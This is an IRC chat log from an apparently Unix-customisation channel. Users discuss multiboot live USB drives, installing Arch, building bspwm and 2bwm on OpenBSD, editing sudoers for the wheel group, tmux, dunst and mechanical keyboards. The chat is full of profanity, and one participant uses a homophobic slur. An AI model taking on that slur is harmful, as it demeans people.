10:01  thang1thang │  in fact, to be honest... I don't use os x for anything anymore
10:01  thang1thang │  I think I'll make a 50GB partition of the hard drive and put arch on it tonight

10:05  thang1thang │  that usb drive that I keep in my shoulder bag every where just in case I ever need it. I took it out and put it away in my dorm room
10:05  thang1thang │  and now I need it -_-
10:08       zygotb │  I lost my USB flash drive collection that I keep on my desk... Not sure what happened since I may have stashed them out of the grand children's reach.
10:09  thang1thang │  ouch...
10:09  thang1thang │  that sucks, I'm sorry
10:09       zygotb │  One went through the laundry and the data was still intact.
10:09         BigE │  i have been looking for a USB stick bandolier
10:09  thang1thang │  found a spare random flash drive hanging about though
10:09  thang1thang │  lol
10:09         BigE │  like, something organized and sturdy that i can put 4 or 5 of them in and then put it around my neck
10:09  thang1thang │  I'd honestly just get a small, robust usb drive that slides in/out and just tie it to your keychain with a ring
10:09         BigE │  but nope, nothing like that exists
10:09         BigE │  hmmm
10:10  thang1thang │  If you got a nice USB drive and paid some money for it
10:10       zygotb │  Luckily my new 32 GB PNY USB flash drive was hidden in a different location, so I still have it.
10:10  thang1thang │  you could get a fairly fast one with like 32-64GB or so
10:10         BigE │  i was thinking about just getting a bunch of those iron key drives
10:10       zygotb │  The 32 GB one is the smallest one I have.
10:10  thang1thang │  and that'll run 2-3 live USBs, several of the popular sysadmin .isos and recovery.isos and hacking.isos and stuff like that
10:11  thang1thang │  We have 2gb/4gb and two 8GB ones floating around the house
10:11  thang1thang │  we don't have anything larger than that :(
10:11       zygotb │  By smallest I meant physical size.
10:11         BigE │  i wish i could get more than 1 live iso on a drive
10:11  thang1thang │  I need to save up and get me a nice 64GB one and keep it on a keychain and take my own advice lol
10:11  thang1thang │  why can't you?
10:11         BigE │  have you ever tried?
10:11  thang1thang │  I was able to put an OS X installation
10:11  thang1thang │  and windows 7 installation on the same flash drive
10:11  thang1thang │  and gparted
10:11         BigE │  well i have, and it is fucking impossible
10:12         BigE │  yeah
10:12         BigE │  those are full OS's
10:12         BigE │  will boot loaders'
10:12  thang1thang │  and 1GB left over for fun shit
10:12  thang1thang │  :D
10:12         BigE │  live ISO's are a bit different
10:12  thang1thang │  http://www.pendrivelinux.com/tag/multiboot-live-usb/
10:13         BigE │  yeah, i have used all of those
10:13  thang1thang │  really? They didn't work?
10:13         BigE │  well, the linux ones
10:13         BigE │  they are all mostly shit
10:13         BigE │  they only support creating multiboot's with a limited selection of distros
10:14         BigE │  so if i want Kali, Tails, PartedMagic and ubuntu all on a live USB, i am shit out of luck with all of those tools
10:14  thang1thang │  ahh
10:14         BigE │  cause they will support 1 or 2 of the 4 at best
10:15  thang1thang │  mmm, weird
10:15  thang1thang │  you'd think you could just make 4 partitions on the flash drive and it would work...
10:15       zygotb │  http://goo.gl/p8RMwI
10:15         quit │  bottomy
10:15         BigE │  of course it would "work"
10:15         join │  bottomy
10:15         mode │  +v bottomy
10:15         BigE │  but how do you then select which partition to boot from
10:15  thang1thang │  I have the 8GB version of that
10:16  thang1thang │  true. You'd have to have some sort of boot loader... Forgot about that.
10:16       zygotb │  You can install to a USB flash drive, along with GRUB, etc.
10:16  thang1thang │  Little too used to having the computer just functional enough to have its own boot loader working
10:16         BigE │  i wonder
10:16         BigE │  if i just installed grub to a partition
10:16         BigE │  let it setup all the booting itself
10:16         BigE │  hmmmmm
10:17  thang1thang │  mmm
10:17  thang1thang │  like if you theoretically treat the flash drive as, say, a 32GB SSD
10:17  thang1thang │  you would just install grub on the hard drive and then your live installs each as a separate "installed OS" on its own partition
10:17  thang1thang │  grub should kick in and you should be able to get a menu of some sort to choose from?
10:18         BigE │  yeah
10:18         BigE │  that is what i am getting apt
10:18         BigE │  at*
10:18         BigE │  lul

10:20         BigE │  everything needs a bottle opener
10:21  thang1thang │  laptops would look really weird with a bottle opener on them
10:22  thang1thang │  but I could actually see a phone with a bottle opener... Just stick it on the top where your hand never is anyway
10:22  thang1thang │  and it could double as a clip to stick your phone on your pocket's outside, or on a belt
10:22  thang1thang │  patent that, bigE, I just made you a millionaire
10:22         BigE │  actually, i figured out how to open bottles on the edge of a table, so maybe i just need a metal USB stick
10:22         BigE │  i have seen cases like that already
10:22         BigE │  sorry
10:23         BigE │  maybe not the belt clip part, but with integrated bottle openers

10:38  thang1thang │  anyway I'm going to restart the computer. I think there's some stuff that needs to be cleaned before os x will partition correctly

12:06         yrmt │  si mais un tweak de merde l'a fait planter
12:06         yrmt │  :p
12:06  thang1thang │  should bs be 8192
12:07  thang1thang │  or 1m? Arch install guide suggests bs=8192
12:07         yrmt │  void linux seems to be the new shit
12:07       Ypnose │  guys, do you know a cheap 11.6" laptop (under 400€ / 550$), which supports OpenBSD?
12:07       Ypnose │  yrmt: arf :(
12:07  thang1thang │  why 11.6" specifically?
12:07         yrmt │  xbps seems good
12:08       Ypnose │  because I want a tiny screen
12:08       Ypnose │  yrmt: xbps is really really powerful
12:08         yrmt │  get a thinkpad 
12:08         yrmt │  The XBPS code is totally compatible with POSIX/SUSv2/C99 standards, and released with a Simplified BSD license (2 clause). There is a well documented API provided by the XBPS Library that is the basis for its frontends to handle binary packages and repositories. Some highlights:
12:08       Ypnose │  yeah, but I'm unable to find something "cheap"
12:08         yrmt │  YES!
12:08         yrmt │  okay this linux seems alright
12:08         yrmt │  I'll give it a chance today
12:09       Ypnose │  yrmt: go to our chan if you need a question
12:09       Ypnose │  two discussions at once :)
12:09  thang1thang │  lol
12:09         yrmt │  sure
12:10  thang1thang │  "we recommend OpenBSD to be run on a 100MHz pentium or higher, with 64MB ram or better"
12:10         yrmt │  Ypnose: xbps chan is a void linux chan?
12:10       Ypnose │  sure
12:10  thang1thang │  yrmt what are you thinking of using xbps for?
12:10         yrmt │  there, jailbreaked again
12:11         yrmt │  thang1thang2: just testing void linux
12:11  thang1thang │  ahhh okay
12:11         yrmt │  I always need at least one linux I like
12:11         yrmt │  so I don't loose my linux fu
12:11  thang1thang │  do you not like arch?
12:11         yrmt │  nope
12:11         yrmt │  I like crux
12:11         yrmt │  but it's a bit too simple
12:12  thang1thang │  lol on void linux's homepage
12:12       zygotb │  FreeBSD is my favorite, thanks to yrmt.
12:12  thang1thang │  "by popular demand (1 user) I've packaged the cinnamon desktop (again)..."

12:14         quit │  venam
12:14  thang1thang │  But, it's fairly well executed for being as tacky as it is so I don't mind it much
12:14       Ypnose │  was more a rofl experiment for main dev
12:14         yrmt │  I'm going to make stuff on cydia
12:14       Ypnose │  so I added it for him
12:14        kirby │  Looks pretty good.
12:15        kirby │  (Void Linux, not the snow).
12:15  thang1thang │  put voidlinux on your iphone
12:15         yrmt │  huehue
12:15         yrmt │  I'll try to get pkgin compiled there
12:15  thang1thang │  ah, you were the one that packaged cinnamon, Ypnose?
12:15      bottomy │  yrmt: :o, what kind of stuff?
12:15       Ypnose │  no, but I'm a packager for Void
12:15       Ypnose │  and I did the entire website
12:15  thang1thang │  ah got it, sounds cool
12:15  thang1thang │  oooh damn
12:15         yrmt │  bottomy: UI changes and cli tools
12:15  thang1thang │  always wanted to learn how to make a website this polished
12:16         yrmt │  I want my iphone to be a good workstation like my mac
12:16      bottomy │  phone, workstation lol
12:16       Ypnose │  thang1thang2: put the mouse on the logo ;)
12:17  thang1thang │  I liked the move you did with making the top bar hard coded into parts on a main wall of text, rather than making people constantly load pages to read information
12:17       Ypnose │  yeah, that was the main idea
12:17        kirby │  Haha, it spins!
12:17  thang1thang │  I bet that reduces a ton of server overhead lol
12:17   emptytapes │  yrmt: whats a decent status bar that would work with 2bwm?
12:17       Ypnose │  people has all informations without scrolling over and over again
12:17       Ypnose │  have*
12:17  thang1thang │  or without loading different pages over and over
12:18       Ypnose │  yeah, true
12:18  thang1thang │  goddamn, the live requires a pentium 2, and 96mb of ram and 350mb of disk?
12:18  thang1thang │  do you think Im' a millionaire?
12:18  thang1thang │  where's my proper linux that requires 2kb of ram?!
12:18         yrmt │  emptytapes: lemonboy bar
12:18   emptytapes │  ok
12:18         yrmt │  Ypnose: the site looks good but you shouldn't make the top bar fixed
12:19       Ypnose │  why?
12:19  thang1thang │  that's the whole point of the top bar
12:19         yrmt │  just have it in absolute position or it's annoying with small screens
12:19  thang1thang │  it's to allow quick reference to the rest of the information without lots of scrolling
12:19       Ypnose │  tested it on IPhone / android phones, and it seems to be ok
12:19  thang1thang │  I have a 13" screen and I'm only using 8" vertical of that for the website atm, looks fine to me
12:19         yrmt │  or make it smaller on scroll
12:20         yrmt │  ar, nevermind; that's just me
12:20       Ypnose │  ouf, you scared me bro
12:20  thang1thang │  loaded the page on my android phone just now
12:21  thang1thang │  yeah the top bar is a little "big" compared to the rest of the screen, but you can't really make it any smaller unless he were to take 'pkg/commits/wiki/donate" and combine it into an 'other' tab on mobile
12:21       Ypnose │  yeah, that's right
12:21       Ypnose │  maybe I could do that
12:21       Ypnose │  I'll think about it
12:22       Ypnose │  feedback is appreciated tho
12:22       Ypnose │  ;)
12:22  thang1thang │  if you do that though, put a kinda obvious down arrow on the button so people know it's a drop-menu
12:22  thang1thang │  and I hate it when I click drop menus on a phone, and then it starts loading a new page before I can select any options.... :p
12:22       Ypnose │  haha, me too
12:23   emptytapes │  is there supposed to be '?=' in the bar Makefile?
12:24   emptytapes │  or is it not displaying the correct chars
12:24       Ypnose │  emptytapes: that's normal
12:24   emptytapes │  ok
12:24   emptytapes │  Cause it wont compile, line 6&9 are missing operators?

12:37  thang1thang │  meh
12:37         yrmt │  lenox drivers are lenox drivers
12:37  thang1thang │  didn't occur to me you could put a desktop linux on a mobile linux phone
12:37  thang1thang │  since you can't put, for example, windows pro on a windows rt tablet
12:37  thang1thang │  of course, that's why linux > windows after all
12:38       Ypnose │  thang1thang2: a man did a script to install void on a phone: https://gist.github.com/radare/7448139
12:38  thang1thang │  I saw that on your github for void, actually
12:38  thang1thang │  how well does voidlinux actually work on a phone? I wouldn't imagine it would be pretty...

21:15         dcat │  nah, I think we talked on deviantart around 2009-2010
21:15         vosh │  gmake gives me xcb errors
21:16         yrmt │  which exactly
21:16         yrmt │  dcat: hm, I've only been okay at unixing for a year

21:16         vosh │  yrmt: at gmake there're lots of errors all related to xcb_

21:17   emptytapes │  helllo
21:17         yrmt │  vosh: then you're missing some libraries
21:17         kori │  emptytapes: you never paid attention to me complimenting your desktop :<
21:17         vosh │  http://pastebin.com/96tWFFGv
21:17   emptytapes │  kori: I didn't realise you did? I'll do that now ;)
21:17         yrmt │  vosh: -lxcb -lxcb-icccm -lxcb-ewmh -lxcb-randr -lxcb-xinerama
21:18         vosh │  but which? that's the problem
21:18         yrmt │  see, these are the libraries needed by bspwm
21:18         yrmt │  check if libxcb is installed
21:18         yrmt │  it should normally
21:18         kori │  emptytapes: it's p. gud I like how you gave more focus to the greens
21:18         vosh │  where do I find it?
21:18         vosh │  /x11r6/?
21:18         yrmt │  vosh: then -lxcb-icccm and -lxcb-ewmh are part of xcb-util-wm
21:18   emptytapes │  kori: done :)
21:19   Neuromatic │  yrmt: The xcb-pkg's cannot be found, thats the major problem
21:19     aqualung │  for openbsd:
21:19     aqualung │  grab xcb-util-wm and ./configure --prefix=/usr/X11R6
21:19         kori │  emptytapes: also, what would you change about my colorscheme? some people gave criticism yesterday saying they'd make the greens bluer
21:20         yrmt │  vosh: do what aqualung says
21:20         dcat │  hm 
21:20     aqualung │  and then edit the makefile for 2bwm
21:20   emptytapes │  kori: I really like it :)
21:20         yrmt │  the other xcb stuff seem to be included in openbsd's X, xenocara
21:20         vosh │  there're several libxcb files in my /urs/X11R6
21:20         yrmt │  vosh: http://www.openbsd.org/cgi-bin/cvsweb/xenocara/lib/
21:20   emptytapes │  kori: Don't change anything
21:20     aqualung │  change the include search paths to /usr/X11R6/whatever
21:20         vosh │  I also installed xcb from the ports
21:20         yrmt │  these are the X libs on openbsd
21:21         kori │  emptytapes: oh okay, I never felt the need to change anything besides foreground/background
21:21   Neuromatic │  of course, the include paths. facepalm myselfs
21:21         kori │  i'm happy with it 
21:21         dcat │  I've never thought of installing all X-related binaries to /usr/X11*
21:21     aqualung │  it does NOT like xcb being spread between X11R6 and local
21:22         yrmt │  logical
21:22         yrmt │  dcat: meh
21:22         dcat │  oh nvm nvm, I thought this was the bspwm binary
21:22   emptytapes │  kori: I really want a monochromatic colour scheme for X so I'm working on that atm
21:22         yrmt │  it belongs with the other shit in /usr/{pkg,local}

21:23         kori │  it's a very nice tool
21:23         yrmt │  vosh: you have everything you need I think
21:23        venam │  check if the script really changed the location in the twobwm.c
21:23         vosh │  still, neither make, nor gmake work

21:25         yrmt │  venam: it won't use the values of the rc file
21:26         kori │  also, yrmt, what colorscheme are you using here? http://fc07.deviantart.net/fs70/f/2013/325/2/9/_osx__having_fun_with_pkgsrc___by_ybeastie-d6v3dmr.png

21:26         yrmt │  and fixed the twobwm.c

21:26         yrmt │  kori: the one that's on my github at the moment
21:26         kori │  yrmt: thanks
21:27         yrmt │  I didn't make it though, credit goes to some faget on dotshare.it
21:27         yrmt │  I should include that in my Xdefaults
21:27         kori │  I think I know what colorscheme you're using
21:27         kori │  http://dotshare.it/dots/634/ This?

02:37       fenriz │  yeah i do:
02:37       fenriz │  is it normal that when i run:  "sudo pacaur -Syyu"
02:37       fenriz │  that i get this:

02:42  thang1thang │  and I'm gonna assume you've been on arch for a while and have your sudo edited so that the #%wheel ALL=(ALL) ALL doesn't have a hashtag?
02:42       fenriz │  hmmm....
02:42       fenriz │  let me go take a look.
02:42  thang1thang │  pacman -S sudo (to install sudo in the first place)
02:42       fenriz │  well i did do that really early on
02:42  thang1thang │   EDITOR=nano visudo to edit the sudo
02:43       fenriz │  my wheel groups DO have hashtags
02:43  thang1thang │  then look for the line: #%wheel ALL...
02:43  thang1thang │  Just remove the hashtag from the line #%wheel ALL=(ALL) ALL
02:43  thang1thang │  that's the only one you need to remove
02:43       fenriz │  gotcha.
02:43       fenriz │  there is one that is: # %wheel ALL=(ALL) NOPASSWD: ALL
02:43       fenriz │  i should inore that one right?
02:44  thang1thang │  as long as you also have a #%wheel ALL=(ALL) ALL yeah ignore that one
02:44  thang1thang │  the nopsswd allows you to run root without the password
02:44  thang1thang │  I'd keep that commented out xD
02:45       fenriz │  lol that is definitely a keeper.
02:45       fenriz │  i am curious though, wtf is a "wheel"
02:45  thang1thang │  it'd be fun to fuck with someone's system with that for sure
02:46  thang1thang │  I'm guessing wheel is just a tag word that they use?
02:46       fenriz │  interesting..
02:46       fenriz │  anyway, i did what you recommended, doctor
02:46  thang1thang │  like ubuntu has apt-get and arch uses pacman for the same thing
02:46       fenriz │  and those symtpoms have gone away.
02:46       fenriz │  Gold Star for you too!
02:46       fenriz │  thanks!
02:46  thang1thang │  whee
02:46  thang1thang │  no problem. I just googled it for 5 seconds

02:48  thang1thang │  the hell is a swap partiton anyway?
02:49       fenriz │  it's when you dont have enough ram
02:49       fenriz │  and...
02:49       fenriz │  wait i learnt this in my OS course.
02:50  thang1thang │  ah got it
02:50       fenriz │  it's when you don't have enough ram, and your kernel uses your hard drive as temporary space to temporarily save stuff it was doing
02:50       fenriz │  (i think i am way off lol)
02:50  thang1thang │  nah you're right
02:50       fenriz │  tuition well spent :D
02:50  thang1thang │  it's kinda how a lot of OS's now save the contents of your ram to disk when the computer sleeps
02:51       fenriz │  ah ha, yeah.
02:51       fenriz │  though with computers these days, it comes with more than enough ram.
02:51  thang1thang │  yeah I'm not gonna bother to make a swap partiton
02:55       fenriz │  are you going to use a WM instead of an DE?
02:55  thang1thang │  me?
02:55  thang1thang │  I'm going to install arch on a new partiton on my mac and I'm going to use dwm on it for the windows
02:55       fenriz │  yeah
02:55       fenriz │  aah okay
02:55  thang1thang │  terminals, CLI, all that shit. :D
02:56       fenriz │  you shouldn't need swap 
02:56       fenriz │  ram usage is pretty low with those things.
02:56  thang1thang │  I wanna truly understand the depth of unix and be able to utilize it to its max potential so yeah

02:58       fenriz │  is it possible to make dunst look a bit transparent
02:58  thang1thang │  http://www.imdb.com/name/nm0000379/
02:58  thang1thang │  put that in a browser window
02:58  thang1thang │  and make your browser window slightly transparent
02:59  thang1thang │  huehuehuehuehue
02:59       fenriz │  jajajaja
02:59  thang1thang │  v 0.4.0 of dunst introducted true transparency
03:00       fenriz │  yay
03:01       fenriz │  i'm thinking of removing notify-send.  it doesn't have what i want.
03:01  thang1thang │  http://www.j4tools.org/
03:02         kori │  fenriz: thanks
03:03       fenriz │  ...np?
03:03       fenriz │  (no idea what i did)
03:03         kori │  and raedwulf's fork is better than upstream
03:03         kori │  imo
03:03       fenriz │  ah it was you
03:03       fenriz │  aside from xft font, how else is it better?
03:03         kori │  full utf8 support
03:03       fenriz │  and what ARE xft font support, it feels like i'm missing out on a feature.
03:04  thang1thang │  xft font support
03:04         kori │  bascially you can name fonts by their names instead of using the X font name definition (i.e. -*-*-*-*-*-*-this-is-so-inconvenient-holy-shit-
03:04         kori │  )
03:04  thang1thang │  allows for antialaiased fonts
03:04         kori │  and also that
03:04       fenriz │  oh holy shit, yes!
03:04         kori │  antialiased fontrs
03:04       fenriz │  i was wondering how that naming scheme came about.
03:04         kori │  s/tr/t/
03:05       fenriz │  i am sold.
03:05       fenriz │  but i've been pretty happy just as it, not that offset is "back"
03:05  thang1thang │  xXx420NoSc0p3FGGtzBLAZEit-4-lyfexXx
03:05  thang1thang │  same way that one came about
03:05       fenriz │  couldn't even look my computer in the face yesterday .
03:05       fenriz │  i felt betrayed.
03:05       fenriz │  thang1thang2: lmao
03:05  thang1thang │  and in dunstrc [global] you have your font =  format = etc etc and you can also set word wrap as wel las a transparency setting
03:06  thang1thang │  the transp. setting in the global section will do what you want :p
03:06       fenriz │  sweet.
03:06       fenriz │  now i will frantically remove all things notify-send 
03:06  thang1thang │  good boy
03:07       fenriz │  thing is, the rounded edges look really nice.
03:07       fenriz │  the thing that gets to me is that it doesn't support stacked message
03:07       fenriz │  by the way, does dunst support icons
03:07  thang1thang │  you can use rounded edges in dunst as well
03:07  thang1thang │  (I think)
03:07       fenriz │  oh lawdy :D

03:08  thang1thang │  bspwm?
03:08    dimeshake │  seems that bar is a bitch with dual monitors 
03:08  thang1thang │  any nice features of it?
03:08       fenriz │  yeah, it's simple, easy to customize

03:09  thang1thang │  dwm is a bitch to customize...
03:09       fenriz │  and has some neat features such as rotating your tiles, balancing them and such.
03:09       fenriz │  it's only nice for me beacuse i came from awesome
03:09       fenriz │  and awesome was way too bloaty.
03:09    dimeshake │  thang1thang2: watch this
03:09    dimeshake │  http://paste.unixhub.net/index.php/NlKe/
03:09        tbuck │  its a hybrid, manual and automatic tiling
03:09  thang1thang │  I've seen that one
03:10  thang1thang │  I love it so much
03:10  thang1thang │  that's bspwm right?
03:10    dimeshake │  yessir
03:10  thang1thang │  ohlawdy
03:10  thang1thang │  I know what I'm putting on my arch once I get it running
03:10       fenriz │  the very same gif that pushed me away from awesome to bspwm.
03:10  thang1thang │  I really like how you can customize the spacing between windows
03:11  thang1thang │  nearly impossible to do that nicely with dwm
03:11    dimeshake │  yeah. i came from i3
03:11    dimeshake │  which is rigid in comparison, but simpler 
03:11         quit │  vypr
03:11         join │  vypr

03:11       fenriz │  i saw my coworker use i3, and it does seem rather rigid
03:11       fenriz │  and "stack"-y
03:11  thang1thang │  what the heck was his graphicky window thing in the gif?
03:12  thang1thang │  with the sunshine and flowers and the dock thing?
03:12       fenriz │  upon looking at the gif closely, i just realized you can skin the mouse cursor
03:12       fenriz │  doing so tonight!
03:12  thang1thang │  yeah
03:12  thang1thang │  Imma skin mine to be a unicorn
03:12  thang1thang │  honestly though I know it sounds stupid
03:12  thang1thang │  but the cursor in OS X has always been my favorite
03:12  thang1thang │  small, out of the way, easy to see and I never really get annoyed by it.
03:14       fenriz │  i dont see the sunflower thing.
03:14       fenriz │  sunshine/slowers.
03:14  thang1thang │  it goes from greyscale background to the color shit
03:14  thang1thang │  and the dock
03:15       fenriz │  i think i missed it
03:15       fenriz │  that gif was going like 100,000miles an hour
03:15  thang1thang │  what the fuck
03:15  thang1thang │  he typed "move me into that new space <--" and it did it
03:15  thang1thang │  o.o
03:15       fenriz │  it was like magic to me when i first saw it.
03:16         vosh │  yeah, what bspc function is that actually? can't seem to find it
03:16  thang1thang │  oooh
03:16  thang1thang │  he opened a image in the browser
03:16  thang1thang │  that's what the colory thing was
03:17        tbuck │  vosh: bspc window -w last.manual
03:17         vosh │  thanks
03:17  thang1thang │  ;-;
03:17  thang1thang │  bspwm even has a loop feature
03:17       fenriz │  what is loop feature?
03:17  thang1thang │  stores your session so when you log in/out everyything stays intact
03:17       fenriz │  yooooo.

03:21  thang1thang │  ooooh

03:30       fenriz │  it doesn't look like it's active.
03:30       fenriz │  the last issue that was closed like 3 months ago;

03:33       fenriz │  vosh: what are those "1, 2, 3" in your terminal?
03:33         dcat │  1+ for nice scrot vosh 
03:33       fenriz │  yeah, i stole his "dot dot dot"
03:33         dcat │  1- for use of locale
03:33  thang1thang │  I like how your shadows are setup fenriz
03:33         vosh │  fenriz: that's tmux
03:33         vosh │  thanks dcat
03:33       fenriz │  thang1thang2: thanks.
03:33  thang1thang │  with the solid black BG, looks really clean
03:34       fenriz │  :D
03:34  thang1thang │  can you set custom background shadow colors on arch?
03:34       fenriz │  aah i see tmux.
03:34       fenriz │  yes
03:34       fenriz │  wait ..!
03:34  thang1thang │  mm?
03:34       fenriz │  i think if you use compton , you may be able to
03:34  thang1thang │  ooh sweet
03:34  thang1thang │  that way I could use a lighter bg color on my windows :D
03:34         vosh │  sure you can.. configure compton to use a certain color and it'll work
03:35         vosh │  I couldn't work without my tmux fenriz
03:35       fenriz │  i keep hearing my coworkers talk about tmux and screen
03:35       fenriz │  i dont quite see what it is for.
03:35       fenriz │  i have never used it
03:35  thang1thang │  tmux is basically a terminal wm inside your wm right?
03:35       fenriz │  i always thought it was a tiler for people who used ubuntu
03:35  thang1thang │  lol
03:36        tbuck │  fenriz: use tmux its great
03:36        tbuck │  say you got irssi open in tmux and you close that window
03:36       fenriz │  can someone give me a TL;DR?
03:36        tbuck │  youre still connected
03:36  thang1thang │  but then how do you get back to said irssi window?
03:36         dcat │  tmux a
03:36        tbuck │  there are sessions
03:36         vosh │  it's a terminal multiplexer
03:37        tbuck │  i can ssh into my box and attach sessions
03:37  thang1thang │  and if you were to close irssi, and then another thing to open the second thing you would say tmux b? or would tmux a just re-open all stuff?
03:37         vosh │  basically you got several terminal sessions in a single terminal window
03:37       fenriz │  interesting.
03:37        tbuck │  its very handy
03:37       fenriz │  so tmux a will give me back the irssi window i JUST closed?
03:38         dcat │  all my terminals are currently tmux'ed
03:38  thang1thang │  http://www.nostalgix.org/2013/02/20/see-it-in-the-dunst.html
03:38         vosh │  for some reason w3m image preview doesn't work in tmux..
03:38        tbuck │  i usually name my irc tmux session
03:38        tbuck │  tmux new -s irc
03:38         dcat │  vosh: $TERM?
03:38        tbuck │  tmux a -t irc
03:38  thang1thang │  fenriz: check out the link on dunst
03:38       fenriz │  will do
03:38         vosh │  dcat: urxvt
03:39         dcat │  I mean, tmux tends to change $TERM
03:39         dcat │  maybe that's why.

03:39   Neuromatic │  vosh: for me w3m imagedisplay works w/ tmux
03:39         vosh │  don't know.. works if in non tmuxed windows anyway.. also I don't really need it that bad. It's just a nice gadget

04:06         amph │  grandma says get a girl who can fsck
04:06  fenriz|dinn │  anyone know where to get cursor themes?
04:06 fenriz|dinnra│  fenriz
04:06         amph │  dmz is nice
04:07         kori │  I use the ubuntu cursors 
04:07         kori │  but dmz is god
04:07        tbuck │  fenriz: search for xcursors
04:07         dcat │  fenriz: xsetroot -cursor_name left_ptr -fg <color1> -bg <color2>
04:07         dcat │  close enough
04:07        tbuck │  theres some in the arch repos probly
04:07       fenriz │  tbuck: thanks.
04:07         vosh │  I just did: xsetroot -cursor_name left_ptr &
04:07       fenriz │  vosh: that's boring
04:07       fenriz │  it'll be nic eif there are screenies to go with it though
04:07         vosh │  it's the normal black cursor.. I like it
04:08        tbuck │  i either stick to the default or vanilla-dmz
04:08       fenriz │  i will check out vanilla dmz
04:08        tbuck │  pretty basic white cursor
04:09       fenriz │  tbuck: that's kinda what i'm looking for.
04:09       fenriz │  but i can't hlep but think "demilitarized zone"
04:14       fenriz │  anyone know why for pacaur, when i run -Syyu
04:14       fenriz │  it goes "no results found for [random package]
04:14         quit │  amph
04:14       fenriz │  everytime it is a random package.
04:15         vosh │  why -Syyu?
04:15         vosh │  I usually do -Syu 
04:15         dcat │  yeah, why are you forcing update?
04:15       fenriz │  i don't think i am.
04:15       fenriz │  forcing is with an -f flag right?
04:15   Neuromatic │  fenriz: --force
04:15       fenriz │  i thought -Syyu means to update and upgrade.
04:16       fenriz │  hmm, okay even with -Syu, i am still getting:
04:16   Neuromatic │  'yy' just builds the db's new

04:16         vosh │  did you add the gits to your repos?
04:17       fenriz │  no, i didn't.
04:17       fenriz │  this was when i was once using yaourt
04:17       fenriz │  so i yaour tinstalled everything.  and a while back, i removed yaourt, and install pacaur
04:18         vosh │  did you also remove all your yourt configs?
04:18       fenriz │  hrm..
04:18       fenriz │  i don't think i did, no.
04:19         vosh │  do so. a pacman -Syu shouldn't check gits and such.. just core and other repos
04:19       fenriz │  hmm but i am using pacaur.
04:19       fenriz │  i do it like "sudo pacaur -Syyu"
04:19         vosh │  what? why?
04:20       fenriz │  because doesn't pacaur -Syyu also check to see if there are updates for the AUR?
04:20   Neuromatic │  fenriz: just do it by hand. much more easy then use an automated aurhelper
04:20         vosh │  if you just want to update your system you just do it with pacman
04:20       fenriz │  i have like 20+ different AUR packages.  checking them against the AUR for version updates is gonna be hellish.
04:20         vosh │  my arch laptop is broken :(
04:21         vosh │  already ordered a new inverter..
04:21   Neuromatic │  fenriz: try 'aurcheck' It can search upload and check versions from aur, but does not download. Its nice
04:21       fenriz │  aah okay.
04:26         vosh │  tbuck: what keyboard is that you're using?
04:26         vosh │  poker?

04:36        tbuck │  i think id trade it for a poker if i had the chance but the differences are subtle
04:36         vosh │  I like it.. 
04:36        tbuck │  thanks
04:36         vosh │  would prefer it over my razer ^^
04:37       fenriz │  i <3 my filco
04:37         vosh │  only if tenkeyless
04:37  thang1thang │  macbookpro chick keys here ;-;
04:38       fenriz │  how is your installation going, thang1thang2 
04:38  thang1thang │  oh right that
04:38  thang1thang │  I forgot to put an IRC Client on my phone
04:39         vosh │  http://s23.postimg.org/hilcz8sdl/DSCN7617.jpg
04:39         vosh │  I'm not going to put some irc client on my phone.. it vibrates all the time anyway
04:40         vosh │  have to change my number soon..
04:40         dcat │  wishful thinking huh
04:40  thang1thang │  well you need to turn the computer off to install arch though
04:41         vosh │  ???
04:41  thang1thang │  don't you?
04:41         vosh │  me?
04:41  thang1thang │  no not you
04:41         vosh │  ok 
04:41  thang1thang │  the reason I haven't started my arch install is I need to turn the computer off to install arch and I was too lazy to do that so I forgot
04:43  thang1thang │  http://i.imgur.com/XiV6G65.jpg
04:43         dcat │  lel
04:44         dcat │  I really like my WASD v2
04:44       fenriz │  o_O
04:44       fenriz │  you ned to turn the computer off to instal stuff?
04:45         vosh │  I really dislike my razer black widow
04:45        tbuck │  dcat: those looked nice
04:45         dcat │  hardware colemak ftw
04:45         dcat │  I was thinking about making my own keyboard though
04:45         dcat │  but I don't know how many would be interested 
04:46  thang1thang │  what would you make it like?
04:46         dcat │  minimalistic
04:46         dcat │  aluminium casing
04:46         dcat │  fully customizable through serial
04:46  thang1thang │  niiiice
04:47         dcat │  remove all that I consider uneccesary with current keyboards
04:47         dcat │  add what's missing from current keyboards too ;P
04:47  thang1thang │  what's missing?
04:47         dcat │  example; drain holes
04:48         dcat │  and probably a filter that catches all the shit that gets down between your keys
04:49        tbuck │  i just tip mine upside down and out that shit falls
04:49         dcat │  take off keys, lift filter, clean the filter, insert gain, and put keys on
04:49        tbuck │  some boards are plate mounted
04:50        tbuck │  kinda acts like a filter i suppose
04:50         vosh │  I do that regularly.. a friend is always coming over to play bf3 and greases my keyboard
04:50         dcat │  urgh
04:50         dcat │  still though
04:50         dcat │  would you guys be interested?
04:50        tbuck │  if you didnt make the price higher for each thing you removed, probably 
04:50        tbuck │  lol
04:51         dcat │  lel
04:51         dcat │  what would you guys pay for something like that?
04:51        tbuck │  $100 easy
04:51        tbuck │  got mine for $120 so around there i guess
04:51         dcat │  or rather, what would you guys want the REST to pay?
04:52        tbuck │  seems to be the average price of a decent board
04:52         dcat │  :/
04:52  thang1thang │  to be honest
04:52  thang1thang │  I need a laptop because of mobility
04:52  thang1thang │  so I can't get a keyboard right now, not that I could afford one
04:53         vosh │  I cannot afford one
04:53  thang1thang │  but for an aluminum casing filter keyboard with drain holes and nice quality like you're suggesting
04:53  thang1thang │  I can see $150-200 for that
04:53         dcat │  currently production of the board would be 325 ;P
04:53  thang1thang │  esp if it had true n-key rollover
04:53        tbuck │  i hadnt considered the aluminum case
04:53        tbuck │  that can add a lot
04:53         dcat │  yeah
04:54         dcat │  if I decide to try to invest in it
04:54         dcat │  you're gonna be alpha tester
04:54         dcat │  (tbuck)
04:54        tbuck │  im down with that
04:55  thang1thang │  there's some crowd sourcing stuff you can do
04:55         dcat │  yeah, I know
04:55  thang1thang │  so if you were able to get like 150-200 people to buy it (/r/mechanical keyboards might be able to help)
04:55  thang1thang │  and that can half the price
04:55         dcat │  but I'm too afraid to disappoint people
04:57  thang1thang │  you wou wouldnt disappoint people
04:57  thang1thang │  don't do something like quickstarter
04:57  thang1thang │  do something where it's just a crowd buy of materials
04:58         dcat │  hm
05:00  thang1thang │  that way they build it themselves. As long as it's not 100% assemble themselves and it's possible to build it with home tools :p
05:00         dcat │  oh also; optional leds
05:00         dcat │  just have a socket where you insert any LED you want
05:00  thang1thang │  wouldn't be a gaming keyboard with 50 different blinkers, would it...
05:00         vosh │  thought you wanted to leave away all the unnecessary stuff..
